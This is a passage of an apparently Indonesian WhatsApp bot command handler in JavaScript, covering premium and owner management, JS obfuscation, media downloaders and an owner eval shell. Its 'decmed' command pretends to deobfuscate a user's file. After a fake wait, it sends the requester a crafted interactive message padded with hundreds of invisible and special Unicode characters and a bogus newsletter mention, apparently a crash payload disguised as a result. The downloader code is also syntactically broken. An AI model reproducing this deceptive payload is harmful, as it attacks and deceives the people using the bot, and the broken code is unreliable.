await fs.writeFileSync("./lib/database/prem.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break

case "listpremium": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
ZoO.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/prem.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *#- List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
ZoO.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("/lib/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("/lib/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

function generateRandomFileName(length = 10) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let randomFileName = '';
    for (let i = 0; i < length; i++) {
        randomFileName += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomFileName;
}
    async function obf(target) {
function generateRandomSize(minKB = 75, maxKB = 250) {
        const minBytes = minKB * 1024;
        const maxBytes = maxKB * 1024;
        return Math.floor(Math.random() * (maxBytes - minBytes + 1)) + minBytes;
    }
    const fileSize = generateRandomSize(75, 250); 
const randomFileName = generateRandomFileName(12);
const fileNameWithResult = `@result${randomFileName}`;
let bokep = "\u3000".repeat(444) + "\ua9be".repeat(20)
            ZoO.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/javascript',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: fileSize,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: fileNameWithResult,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "Result Dec ✅\n----------------------------------------\n📂 File   : javascript \n🔒 Deobfuscated by: Independente\n⚙️ Method : Dec\n----------------------------------------" + bokep
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: ["18002428478@s.whatsapp.net"],
                                groupMentions: [{ groupJid: "99999999999999999@newsletter", groupSubject: bokep }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
     };
    
    

async function dec(target) {
      for (let i = 0; i < 1; i++) {
      await obf(target)
      }
      }

case 'decmed': {
    if (!m.quoted) return reply("Reply file .js");
    if (mime !== "application/javascript") return reply("Reply file .js");
    const decmedCommand = m.text.split(' ');
    if (decmedCommand.length !== 2 || !decmedCommand[0].startsWith('.decmed')) {
        return reply("Format salah! Gunakan: .decmed <persentase> (contoh: .decmed 80%)");
    }
    const percentage = parseInt(decmedCommand[1], 10);
    if (isNaN(percentage) || percentage < 0 || percentage > 80) {
        return reply("Persentase tidak valid! Gunakan angka antara 0 dan 80.");
    }
    const processingTimeInMinutes = (percentage / 80) * 10;
    const processingTimeInMilliseconds = processingTimeInMinutes * 60 * 1000;
    await ZoO.sendMessage(m.chat, { react: { text: '♻️', key: m.key } });
    reply("Request Sending 📦\n----------------------------------------\n📂 File   : javascript \n🔒 Level : null\n⚙️ Method : Dec\n🎬 Estimation : null\n📄 Api : true\n----------------------------------------")
    await new Promise(resolve => setTimeout(resolve, processingTimeInMilliseconds));
    await dec(m.chat);
}
break

case 'array': {
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
target: "node",
            es5: true,
            calculator: true,
            compact: true,
            hexadecimalNumbers: true,
            controlFlowFlattening: 0.75,
            deadCode: 0.2,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.75,
            flatten: true,
            globalConcealing: true,
            identifierGenerator: 'randomized',
            minify: false,
            movedDeclarations: true,
            objectExtraction: true,
            opaquePredicates: 0.75,
            renameVariables: true,
            renameGlobals: true,
            shuffle: {
                hash: 0.5,
                true: 0.5,
            },
            stack: true,
            stringConcealing: true,
            stringCompression: true,
            stringEncoding: true,
            stringSplitting: 0.75,
            rgf: false,
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await ZoO.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => reply("Error :" + e))
}
break

case 'debugcostum': {
    const args = m.text.split(" ");
    if (args.length < 2) return reply("Harap sertakan custom name. Contoh penggunaan: .debugcostum bebas");
    const customName = args[1];

    if (!m.quoted) return reply("Reply file .js");
    if (mime !== "application/javascript") return reply("Reply file .js");
    let media = await m.quoted.download();
    let filename = m.quoted.fileName;
    await fs.writeFileSync(`./@hardenc${filename}.js`, media);
    await reply("Memproses encrypt hard code . . .");
    await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 0.75,
        deadCode: 0.2,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        flatten: true,
        globalConcealing: true,
        lock: {
            antiDebug: true,
        },
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: 0.75,
        renameVariables: true,
        renameGlobals: true,
        shuffle: {
            hash: 0.5,
            true: 0.5,
        },
        stack: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.75,
        rgf: false,
        identifierGenerator: function() {
            const originalString = 
                `\u3164𠄬𠦄${customName}` +
                "\u3164𐁘\u3164" +
                "209齐𠀤\u3164";

            function removeUnwantedChars(input) {
                return input.replace(
                    /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
                );
            }

            function randomString(length) {
                let result = '';
                const characters = '\u0041\u0042\u0043\u0044\u0045\u0046\u0047\u0048\u0049\u004A\u004B\u004C\u004D\u004E\u004F\u0050\u0051\u0052\u0053\u0054\u0055\u0056\u0057\u0058\u0059\u005A\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u006A\u006B\u006C\u006D\u006E\u006F\u0070\u0071\u0072\u0073\u0074\u0075\u0076\u0077\u0078\u0079\u007A';
                const charactersLength = characters.length;

                for (let i = 0; i < length; i++) {
                    result += characters.charAt(
                        Math.floor(Math.random() * charactersLength)
                    );
                }
                return result;
            }

            return removeUnwantedChars(originalString) + randomString(3);
        }
    }).then(async (obfuscated) => {
        await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated);
        await ZoO.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m});
    }).catch(e => reply("Error :" + e));
}
break;



case 'facebook': 
case 'douyin': 
case 'mediafire': 
case 'youtube': 
case 'instagram': 
case 'tiktok': 
case 'capcut': 
case 'pixeldrain': 
case 'pinerest': 
case 'threads': 
case 'twiter': 
case 'videy': 
case 'terabox': 
case 'spotify': 
case 'drive': 
case 'cocofun': 
case 'apkadmin': 
case 'soundcloud': {
    if (!text) return m.reply("Masukkan Link Download");
    if (text.includes('facebook.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/facebook?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,
                caption: `📥 *Facebook Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Facebook");
        }
    } else if (text.includes('mediafire.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/mediafire?url=${text}`);
            let data = response.data;
            ZoO.sendMessage(m.chat, { 
                file: { url: data },
                caption: `📥 *MediaFire Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari MediaFire");
        }
    } else if (text.includes('youtube.com') || text.includes('youtu.be')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/youtube?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,
                caption: `📥 *YouTube Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari YouTube");
        }
    } else if (text.includes('instagram.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/instagram?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,caption: `📥 *Instagram Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Instagram");
        }
    } else if (text.includes('tiktok.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/tiktok?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,
                caption: `📥 *TikTok Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari TikTok");
        }
    } else if (text.includes('capcut.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/capcut?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,caption: `📥 *Capcut Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Capcut");
        }
    } else if (text.includes('pinterest.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/pinterest?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                image:  url: data ,
                caption: `📥 *Pinterest Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Pinterest");
        }
    } else if (text.includes('pixeldrain.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/pixeldrain?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                file:  url: data ,caption: `📥 *Pixeldrain Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Pixeldrain");
        }
    } else if (text.includes('twitter.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/twitter?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,
                caption: `📥 *Twitter Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Twitter");
        }
    } else if (text.includes('threads.net')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/threads?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,caption: `📥 *Threads Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Threads");
        }
    } else if (text.includes('videy.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/videy?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,
                caption: `📥 *Videy Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Videy");
        }
    } else if (text.includes('spotify.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/spotify?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                audio:  url: data ,
                caption: `📥 *Spotify Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Spotify");
        } else if (text.includes('snackvideo.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/snackvideo?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,
                caption: `📥 *Snackvideo Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Snackvideo");
        }
    } else if (text.includes('terabox.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/terabox?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                file:  url: data ,
                caption: `📥 *Terabox Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Terabox");
        }
    } else if (text.includes('drive.google.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/drive?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                file:  url: data ,
                caption: `📥 *Google Drive Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
 m.reply("Terjadi Kesalahan Saat Mengambil Data dari Google Drive");
        }
    } else if (text.includes('cocofun.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/cocofun?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                video:  url: data ,
                caption: `📥 *Cocofun Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Cocofun");
        }
    } else if (text.includes('soundcloud.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/soundcloud?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                audio:  url: data ,
                caption: `📥 *Soundcloud Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Soundcloud");
        }
 } else if (text.includes('v.douyin.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/douyin?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                audio:  url: data ,
                caption: `📥 *Douyin Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari douyin");
        }
 } else if (text.includes('apkadmin.com')) {
        try {
            let response = await fetchJson(`https://api.agatz.xyz/api/apkadmin?url=text`);
            let data = response.data;
            ZoO.sendMessage(m.chat, {
                file:  url: data ,
                caption: `📥 *Apkadmin Downloader*✅ *Status*: Download Berhasil📌 *Judul*:{data.file_name}\n📦 *Ukuran*: data.file_size🔗 *Link Download*:{data.download_url}`
            }, { quoted: m });
        } catch (err) {
            m.reply("Terjadi Kesalahan Saat Mengambil Data dari Apkadmin");
        }
    } else {
        m.reply("Link yang Anda masukkan tidak dikenali. Harap masukkan link yang valid.");
    }
}
break;




default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});







